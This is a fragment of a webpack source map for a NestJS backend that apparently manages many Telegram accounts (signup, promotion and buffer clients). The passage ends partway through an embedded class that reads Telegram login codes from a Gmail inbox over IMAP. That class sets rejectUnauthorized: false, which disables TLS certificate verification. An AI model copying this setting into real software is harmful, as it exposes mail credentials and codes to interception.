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","sources":[".././src/IMap/IMap.ts",".././src/app.controller.ts",".././src/app.module.ts",".././src/app.service.ts",".././src/cloudinary.ts",".././src/components/ConfigurationInit/configuration.schema.ts",".././src/components/ConfigurationInit/init.controller.ts",".././src/components/ConfigurationInit/init.module.ts",".././src/components/ConfigurationInit/init.service.ts",".././src/components/Telegram/Telegram.controller.ts",".././src/components/Telegram/Telegram.module.ts",".././src/components/Telegram/Telegram.service.ts",".././src/components/Telegram/TelegramManager.ts",".././src/components/Telegram/config/telegram-validation.config.ts",".././src/components/Telegram/dto/batch-operations.dto.ts",".././src/components/Telegram/dto/common-responses.dto.ts",".././src/components/Telegram/dto/contact-management.dto.ts",".././src/components/Telegram/dto/create-chat-folder.dto.ts",".././src/components/Telegram/dto/group-operations.dto.ts",".././src/components/Telegram/dto/index.ts",".././src/components/Telegram/dto/media-operations.dto.ts",".././src/components/Telegram/dto/message-search.dto.ts",".././src/components/Telegram/dto/metadata-operations.dto.ts",".././src/components/Telegram/dto/profile-settings.dto.ts",".././src/components/Telegram/dto/schedule-operations.dto.ts",".././src/components/Telegram/types/telegram-error.ts",".././src/components/Telegram/utils/client-metadata.ts",".././src/components/Telegram/utils/connection-manager.ts",".././src/components/Telegram/utils/rate-limiter.ts",".././src/components/Telegram/utils/telegram-logger.ts",".././src/components/TgSignup/TgSignup.module.ts",".././src/components/TgSignup/TgSignup.service.ts",".././src/components/TgSignup/dto/tg-signup.dto.ts",".././src/components/TgSignup/tgSignup.controller.ts",".././src/components/active-channels/active-channels.controller.ts",".././src/components/active-channels/active-channels.module.ts",".././src/components/active-channels/active-channels.service.ts",".././src/components/active-channels/dto/add-reaction.dto.ts",".././src/components/active-channels/dto/create-active-channel.dto.ts",".././src/components/active-channels/dto/update-active-channel.dto.ts",".././src/components/active-channels/schemas/active-channel.schema.ts",".././src/components/archived-clients/archived-client.controller.ts",".././src/components/archived-clients/archived-client.module.ts",".././src/components/archived-clients/archived-client.service.ts",".././src/components/buffer-clients/buffer-client.controller.ts",".././src/components/buffer-clients/buffer-client.module.ts",".././src/components/buffer-clients/buffer-client.service.ts",".././src/components/buffer-clients/dto/create-buffer-client.dto.ts",".././src/components/buffer-clients/dto/search-buffer- client.dto.ts",".././src/components/buffer-clients/dto/update-buffer-client.dto.ts",".././src/components/buffer-clients/schemas/buffer-client.schema.ts",".././src/components/builds/build.controller.ts",".././src/components/builds/build.module.ts",".././src/components/builds/build.service.ts",".././src/components/builds/builds.schema.ts",".././src/components/channels/channels.controller.ts",".././src/components/channels/channels.module.ts",".././src/components/channels/channels.service.ts",".././src/components/channels/dto/create-channel.dto.ts",".././src/components/channels/dto/search-channel.dto.ts",".././src/components/channels/dto/update-channel.dto.ts",".././src/components/channels/schemas/channel.schema.ts",".././src/components/clients/client.controller.ts",".././src/components/clients/client.module.ts",".././src/components/clients/client.service.ts",".././src/components/clients/dto/create-client.dto.ts",".././src/components/clients/dto/search-client.dto.ts",".././src/components/clients/dto/update-client.dto.ts",".././src/components/clients/schemas/client.schema.ts",".././src/components/n-point/npoint.controller.ts",".././src/components/n-point/npoint.module.ts",".././src/components/n-point/npoint.service.ts",".././src/components/promote-clients/dto/create-promote-client.dto.ts",".././src/components/promote-clients/dto/search-promote-client.dto.ts",".././src/components/promote-clients/dto/update-promote-client.dto.ts",".././src/components/promote-clients/promote-client.controller.ts",".././src/components/promote-clients/promote-client.module.ts",".././src/components/promote-clients/promote-client.service.ts",".././src/components/promote-clients/schemas/promote-client.schema.ts",".././src/components/promote-msgs/promote-msgs.controller.ts",".././src/components/promote-msgs/promote-msgs.module.ts",".././src/components/promote-msgs/promote-msgs.schema.ts",".././src/components/promote-msgs/promote-msgs.service.ts",".././src/components/promote-stats/dto/create-promote-stat.dto.ts",".././src/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/shared/dto/execute-request.dto.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/interfaces/telegram.ts",".././src/main.ts",".././src/middlewares/logger.middleware.ts",".././src/middlewares/throttle.middleware.ts",".././src/utils.ts",".././src/utils/fetchWithTimeout.ts",".././src/utils/logbots.ts",".././src/utils/parseError.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"https\"","../external commonjs \"imap\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"fs\"","../external node-commonjs \"http\"","../external node-commonjs \"path\"","../webpack/bootstrap","../webpack/before-startup","../webpack/startup","../webpack/after-startup"],"sourcesContent":["import Imap from 'imap';\nimport { fetchNumbersFromString, sleep } from '../utils';\nimport { parseError } from '../utils/parseError';\n\nexport class MailReader {\n    private static instance: MailReader;\n    private imap: Imap;\n    private isReady: boolean = false;\n    private result: string = '';\n\n    private constructor() {\n        this.imap = new Imap({\n            user: process.env.GMAIL_ADD,\n            password: process.env.GMAIL_PASS,\n            host: 'imap.gmail.com',\n            port: 993,\n            tls: true,\n            tlsOptions: {\n                rejectUnauthorized: false,\n            },\n        });\n\n        this.imap.on('ready', () => {\n            console.log('Mail is Ready');\n            this.isReady = true;\n        });\n\n        this.imap.on('error', (err) => {\n            console.error('SomeError:', err);\n            this.isReady = false;\n        });\n\n        this.imap.on('end', () => {\n            console.log('Connection ended');\n            this.isReady = false;\n        });\n    }\n\n    public static getInstance(): MailReader {\n        if (!MailReader.instance) {\n            MailReader.instance = new MailReader();\n        }\n        return MailReader.instance;\n    }\n\n    public async connectToMail(): Promise<void> {\n        console.log('Connecting to mail server');\n        try {\n            this.imap.connect();\n            this.isReady = true;\n            console.log('Connected to mail server');\n        } catch (err) {\n            console.error('Error connecting to mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async disconnectFromMail(): Promise<void> {\n        console.log('Disconnecting from mail server');\n        try {\n            this.imap.end();\n            this.isReady = false;\n            console.log('Disconnected from mail server');\n        } catch (err) {\n            console.error('Error disconnecting from mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async isMailReady(): Promise<boolean> {\n        return this.isReady;\n    }\n\n    public async getCode(): Promise<string> {\n        console.log(\"MailReady : \", this.isReady)\n        if (!this.isReady) {\n            console.log(\"Re-Connecting mail server\");\n            await this.connectToMail();\n            await sleep(10000);\n        }\n\n        try {\n            await this.openInbox();\n\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\n            console.log('Inbox Opened');\n\n            const results = await new Promise<any[]>((resolve, reject) => {\n                this.imap.search(searchCriteria, 